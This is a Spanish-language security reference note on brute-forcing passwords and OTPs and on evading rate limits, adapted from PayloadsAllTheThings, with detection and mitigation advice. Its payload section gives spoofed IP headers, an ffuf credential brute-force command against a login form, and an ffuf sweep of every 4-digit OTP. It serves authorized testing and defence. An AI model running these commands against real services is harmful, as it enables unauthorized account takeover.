---
tags:
  - seguridad-web
  - owasp
  - brute-force
aliases:
  - Fuerza bruta y rate limiting
  - Brute Force Rate Limit
  - Bypass de rate limiting
---

# Fuerza bruta y rate limiting

**La fuerza bruta prueba sistemáticamente credenciales, códigos OTP o tokens hasta acertar; el rate limiting es el control que debería frenarla. Gran parte del ataque consiste en encontrar formas de eludir ese límite (IP rotation, manipulación de cabeceras, condiciones de carrera).**

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Los objetivos típicos son contraseñas, PIN/OTP de 4–6 dígitos (espacio pequeño) y tokens de reset. El defensor limita intentos por usuario/IP/sesión; el atacante busca el resquicio: el contador asociado a un valor que él controla (IP vía cabeceras falsificadas), el bloqueo que solo mira el usuario y no el código, o ventanas de [[Race Conditions]] donde el contador no se actualiza a tiempo. La [[Aleatoriedad insegura]] reduce aún más el espacio de búsqueda de tokens.

## Detección y pruebas
Mide cuántos intentos se permiten y a qué entidad se asocia el límite (IP, cuenta, sesión, token). Prueba a variar la cabecera de IP, a rotar identificadores, a paralelizar y a reiniciar la sesión. Comprueba si el OTP/código tiene límite propio y caducidad. Diferencia "bloqueo de cuenta" (DoS potencial) de "límite por IP".

## Explotación / payloads
**Bypass por cabeceras de IP falsificadas** (rotando el valor en cada intento):

```http
X-Forwarded-For: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
```

**Fuerza bruta de credenciales con ffuf:**

```bash
ffuf -u https://victima.com/login -X POST \
  -d "user=admin&pass=FUZZ" -w rockyou.txt \
  -H "Content-Type: application/x-www-form-urlencoded" -fc 401
```

**Fuerza bruta de OTP de 4 dígitos** (0000–9999) con Burp Intruder o:

```bash
ffuf -u https://victima.com/verify -X POST -d "otp=FUZZ" \
  -w <(seq -w 0000 9999) -mr "exitoso"
```

**Race condition / paralelismo:** enviar muchos intentos simultáneos antes de que el contador suba (ver Turbo Intruder en [[Race Conditions]]).

## Mitigación
- Asociar el límite a la **cuenta** (y a la IP real del proxy de confianza, no a cabeceras del cliente).
- Backoff exponencial, CAPTCHA tras N fallos y bloqueo temporal con notificación.
- OTP largos, de un solo uso, con caducidad corta y límite de intentos por código.
- MFA, detección de patrones (credential stuffing) y actualización atómica del contador.

## Herramientas
- **Hydra**, **Medusa** — fuerza bruta de servicios.
- **Burp Intruder**, **ffuf** — fuerza bruta web y pruebas de bypass.

---
🔗 Relacionado: [[Race Conditions]] · [[Aleatoriedad insegura]] · [[Account Takeover]] · [[Pentesting en Redes]]
📚 Fuente: [PayloadsAllTheThings — Brute Force Rate Limit](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit) (MIT, © Swissky)
